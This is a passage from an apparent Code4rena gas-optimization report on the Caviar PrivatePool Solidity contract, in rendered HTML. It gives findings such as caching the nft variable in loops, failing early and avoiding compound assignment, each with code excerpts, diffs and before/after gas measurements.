class=\"mtk8\">-        virtualNftReserves += uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualNftReserves += uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 royaltyFeeAmount = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _nft = nft;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer each nft from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC721(_nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L441-L448\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L441-L448</a></p>\n<h3 id=\"cache-nft-to-avoid-storage-reads-on-each-loop-iteration-2\" style=\"position:relative;\"><a href=\"#cache-nft-to-avoid-storage-reads-on-each-loop-iteration-2\" aria-label=\"cache nft to avoid storage reads on each loop iteration 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>nft</code> to avoid storage reads on each loop iteration</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">441</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">442</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// @audit: sload on every iteration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">443</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">444</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">445</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// transfer the output nfts to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">446</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">447</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// @audit: sload on every iteration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">448</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..5e4e292 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -438,13 +438,14 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the input nfts from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _nft = nft;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; inputTokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC721(_nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the output nfts to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; outputTokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC721(_nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L496-L498\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L496-L498</a></p>\n<h3 id=\"cache-nft-to-avoid-storage-reads-on-each-loop-iteration-3\" style=\"position:relative;\"><a href=\"#cache-nft-to-avoid-storage-reads-on-each-loop-iteration-3\" aria-label=\"cache nft to avoid storage reads on each loop iteration 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>nft</code> to avoid storage reads on each loop iteration</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">497</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// @audit: sload on every iteration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">498</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..65eee4c 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -493,8 +493,9 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the nfts from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _nft = nft;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC721(_nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (baseToken != address(0)) {</span></span></span></code></pre>\n<h2 id=\"g-05-rearrange-code-to-fail-early\" style=\"position:relative;\"><a href=\"#g-05-rearrange-code-to-fail-early\" aria-label=\"g 05 rearrange code to fail early permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Rearrange code to fail early</h2>\n<p>In the instance below, two gas-intensive internal functions are invoked before the <code>if</code> statement. If the check causes a revert, the gas consumed in the first two internal functions will not be refunded. Move the <code>if</code> statement to the top of the function to save gas for users that trigger a revert.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L219-L225\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L219-L225</a></p>\n<p><em>Gas Savings for <code>PrivatePool.buy</code>, obtained via protocol’s tests: Avg 327 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>74037</td>\n<td>158864</td>\n<td>70884</td>\n<td>24</td>\n</tr>\n<tr>\n<td>After</td>\n<td>74040</td>\n<td>158867</td>\n<td>70557</td>\n<td>24</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">sumWeightsAndValidateProof</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proof</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">buyQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">224</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..7465103 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -215,15 +215,15 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sum of weights of the NFTs to buy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Effects ~~~ //</span></span></span></code></pre>\n<h2 id=\"g-06-x--yx---y-costs-more-gas-than-x--x--yx--x---y-for-state-variables\" style=\"position:relative;\"><a href=\"#g-06-x--yx---y-costs-more-gas-than-x--x--yx--x---y-for-state-variables\" aria-label=\"g 06 x  yx   y costs more gas than x  x  yx  x   y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] <code>x += y/x -= y</code> costs more gas than <code>x = x + y/x = x - y</code> for state variables</h2>\n<p>Total Instances: <code>2</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231</a></p>\n<p><em>Gas Savings for <code>PrivatePool.buy</code>, obtained via protocol’s tests: Avg 289 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>74037</td>\n<td>158864</td>\n<td>70884</td>\n<td>24</td>\n</tr>\n<tr>\n<td>After</td>\n<td>73713</td>\n<td>158540</td>\n<td>70595</td>\n<td>24</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..a0813a6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -227,8 +227,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualNftReserves -= uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        virtualBaseTokenReserves = virtualBaseTokenReserves + uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        virtualNftReserves = virtualNftReserves - uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L323-L324\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L323-L324</a></p>\n<p><em>Gas Savings for <code>PrivatePool.sell</code>, obtained via protocol’s tests: Avg 255 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>50139</td>\n<td>170448</td>\n<td>81969</td>\n<td>25</td>\n</tr>\n<tr>\n<td>After</td>\n<td>49891</td>\n<td>170138</td>\n<td>81714</td>\n<td>25</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">323</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">324</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol 